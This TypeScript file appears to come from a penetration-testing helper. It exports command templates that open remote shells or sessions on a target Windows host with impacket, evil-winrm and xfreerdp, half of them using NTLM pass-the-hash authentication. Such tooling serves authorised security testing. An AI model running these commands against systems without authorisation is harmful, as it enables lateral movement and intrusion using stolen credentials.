interface Command {
  name: string;
  template: string;
  authType: "password" | "ntlmHash";
}

const localCommands: Command[] = [
  {
    name: "local-impacket-wmiexec",
    template: "impacket-wmiexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    name: "local-impacket-psexec",
    template: "impacket-psexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    name: "local-impacket-smbexec",
    template: "impacket-smbexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    name: "local-impacket-smbclient",
    template: "impacket-smbclient '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    name: "local-xfreerdp",
    template:
      "xfreerdp /u:'{username}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "password",
  },
  {
    name: "local-Evil-WinRM",
    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
    authType: "password",
  },
  {
    name: "local-impacket-wmiexec (NTLM)",
    template:
      "impacket-wmiexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    name: "local-impacket-psexec (NTLM)",
    template:
      "impacket-psexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    name: "local-impacket-smbexec (NTLM)",
    template:
      "impacket-smbexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    name: "local-impacket-smbclient (NTLM)",
    template:
      "impacket-smbclient '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    name: "local-Evil-WinRM (NTLM)",
    template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
    authType: "ntlmHash",
  },
  {
    name: "local-xfreerdp (NTLM)",
    template:
      "xfreerdp /u:'{username}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "ntlmHash",
  },
];

export default localCommands;
